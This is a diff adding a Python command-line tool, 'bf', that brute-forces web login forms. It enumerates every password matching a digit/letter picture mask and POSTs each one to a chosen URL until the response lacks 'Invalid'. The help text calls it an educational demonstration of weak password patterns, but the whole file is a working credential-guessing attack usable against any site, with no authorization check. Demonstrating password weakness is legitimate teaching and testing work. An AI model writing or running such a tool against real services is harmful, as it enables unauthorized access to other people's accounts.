@@ -1,0 +1,90 @@
+#!/usr/bin/env python3
+
+# ┌────────────────────────────────────────────────────────┐
+# │ Type / Version : python / 2026.02.17-01                │
+# │ Tool Name      : bf                                    │
+# │ Author         : Mark Hamilton (Co-Pilot assisted)     │
+# │ Purpose        : Pattern-based Brute Force Demonstrator│
+# │ Package        : toolbox                               │
+# └────────────────────────────────────────────────────────┘
+
+import argparse
+import string
+import requests
+from itertools import product
+
+# ─── Character Sets ───────────────────────────────────────────
+CHARSETS = {
+    "9": string.digits,                     # 0–9
+    "A": string.ascii_letters,              # a–zA–Z
+    "X": string.ascii_letters + string.digits  # a–zA–Z0–9
+}
+
+# ─── Generate Passwords from Picture Mask ─────────────────────
+def generate_from_picture(pattern):
+    pools = []
+    for char in pattern:
+        if char not in CHARSETS:
+            raise ValueError(f"Unsupported picture character: {char}")
+        pools.append(CHARSETS[char])
+    for combo in product(*pools):
+        yield "".join(combo)
+
+# ─── Attempt Login ────────────────────────────────────────────
+def attempt_login(url, username, password):
+    data = {"username": username, "password": password}
+    try:
+        response = requests.post(url, data=data, timeout=5)
+        return response
+    except requests.RequestException:
+        print("[!] Network error during request")
+        return None
+
+# ─── Brute Force Logic ────────────────────────────────────────
+def brute_force(url, username, pattern, quiet):
+    print(f"[INFO] Starting brute force using pattern: {pattern}")
+    print(f"[INFO] Username: {username}")
+    print("")
+
+    for password in generate_from_picture(pattern):
+        if not quiet:
+            print(f"[-] Trying: {password}")
+
+        response = attempt_login(url, username, password)
+        if not response:
+            continue
+
+        # Educational assumption: "Invalid" means failure
+        if "Invalid" not in response.text:
+            print("")
+            print(f"[+] Valid credentials found:")
+            print(f"    Username: {username}")
+            print(f"    Password: {password}")
+            return
+
+    print("\n[!] No valid credentials found using this pattern.")
+
+# ─── Main ─────────────────────────────────────────────────────
+def main():
+    parser = argparse.ArgumentParser(
+        description=(
+            "Educational brute-force demonstration tool using COBOL-style "
+            "picture masks (e.g., 9999, 99A9, X9A9). Shows how predictable "
+            "password patterns can be easily enumerated."
+        )
+    )
+
+    parser.add_argument("--url", required=True,
+                        help="Target URL accepting POST username/password fields")
+    parser.add_argument("--user", required=True,
+                        help="Username to test")
+    parser.add_argument("--pic", required=True,
+                        help="Password pattern (9=digit, A=letter, X=alphanumeric)")
+    parser.add_argument("--quiet", action="store_true",
+                        help="Suppress per-attempt output")
+
+    args = parser.parse_args()
+    brute_force(args.url, args.user, args.pic, args.quiet)
+
+if __name__ == "__main__":
+    main()
